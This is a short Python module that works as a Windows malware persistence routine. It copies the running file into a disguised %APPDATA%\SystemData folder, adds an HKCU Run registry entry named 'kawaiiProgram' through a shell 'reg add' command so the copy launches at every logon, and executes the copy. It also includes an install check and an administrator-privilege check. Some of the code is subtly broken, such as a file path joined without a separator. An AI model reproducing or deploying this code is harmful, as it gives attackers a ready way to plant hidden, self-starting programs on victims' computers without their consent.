import os
import subprocess
import shutil
import ctypes
def perform(this_filename:__file__):
    kawaii_executable_path = os.getcwd()+this_filename
    banana_destination = os.path.join(os.getenv("APPDATA"), "SystemData")
    os.makedirs(banana_destination, exist_ok=True)
    if not os.path.exists(os.path.join(banana_destination, this_filename)):
        shutil.copy(kawaii_executable_path, banana_destination)
        registry_key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        registry_entry_name = "kawaiiProgram"
        registry_entry_value = f'"{os.path.join(banana_destination, this_filename)}"'
        command = f'reg add "{registry_key}" /v "{registry_entry_name}" /t REG_SZ /d {registry_entry_value} /f'
        subprocess.call(command, shell=True)
        os.system(os.path.join(banana_destination, this_filename))
def isDone(this_filename:__file__):
    banana_destination = os.path.join(os.getenv("APPDATA"), "SystemData")
    if os.path.exists(os.path.join(banana_destination, this_filename)):
        return True
    else:
        return False
def isAdmin():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin